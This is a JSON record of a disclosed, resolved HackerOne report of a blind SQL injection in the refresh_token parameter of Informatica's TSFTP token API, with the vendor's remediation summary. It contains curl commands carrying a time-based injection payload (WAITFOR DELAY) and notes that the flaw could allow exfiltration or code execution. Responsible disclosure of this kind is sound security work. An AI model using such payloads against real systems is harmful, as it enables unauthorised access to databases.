@@ -1,0 +1,155 @@
+{
+  "id": 1034625,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDM0NjI1",
+  "url": "https://hackerone.com/reports/1034625",
+  "title": "Blind SQL injection at tsftp.informatica.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-11-14T17:39:02.503Z",
+  "submitted_at": "2020-11-14T17:39:02.567Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "r1pley",
+    "url": "/r1pley",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/FqW4AnqpJ156Nqw3phPcTG4x/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 453,
+    "url": "https://hackerone.com/informatica",
+    "handle": "informatica",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Informatica",
+      "twitter_handle": "informatica",
+      "website": "https://www.informatica.com/",
+      "about": "Informatica Corporation is the world’s number one independent provider of data integration software."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-16T10:32:06.952Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-15T17:58:39.882Z",
+  "team_member_agreed_on_going_public_at": "2020-11-16T10:32:06.844Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The parameter `refresh_token` sent to the REST path /api/v1/token is vulnerable to blind SQL injection.\n\nCompare the response time of these 2 requests:\n\n```\n$ time curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H \"accept: application/json\" -H \"Content-Type: application/x-www-form-urlencoded\" -d \"grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--\"\n{\"error\":\"invalid_grant\"}curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total\n```\n\nvs\n\n```\n$ time curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H \"accept: application/json\" -H \"Content-Type: application/x-www-form-urlencoded\" -d \"grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--\"\n{\"error\":\"invalid_grant\"}curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total\n```\nand notice that the WAITFOR DELAY command is executed.\n\n## Impact\n\nBlind SQL injection can be exploited to exfiltrate data from the FTP server, bypass authentication or for remote code execution.\n\nI stopped my testing at the time-based PoC because I didn't want to risk accessing sensitive data. If you would like to though, I can continue exploiting this vulnerability to present the above impact in practice, eg by getting the database version string.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-12-15T17:58:39.960Z",
+  "allow_singular_disclosure_after": -170284696.92274168,
+  "singular_disclosure_allowed": true,
+  "vote_count": 67,
+  "voters": [
+    "alolowiwael",
+    "sw33tlie",
+    "xploiterr",
+    "mashoud1122",
+    "poneglyph",
+    "rzx007x",
+    "rook1337",
+    "ali",
+    "tess",
+    "dnelsaka",
+    "and 57 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 25452,
+      "category": "team",
+      "content": "Researcher identified a time based/blind SQL injection in an Informatica TSFTP website and responsibly disclosed via this report. \n\nInformatica's incident response team engaged within minutes of the report being received, bringing the site offline for maintenance as the issue was resolved. Following resolution of the issue and confirmation from our security team the site was brought back online. Additionally web server access logs and database logs from before the issue existed were reviewed, showing the issue had not been exploited by any malicious attackers.",
+      "updated_at": "2020-11-16T10:32:02.536Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 582228,
+        "username": "nheffernan",
+        "name": "Niall Heffernan",
+        "bio": null,
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": null,
+        "created_at": "2019-04-15T10:34:20.268Z",
+        "url": "https://hackerone.com/nheffernan",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
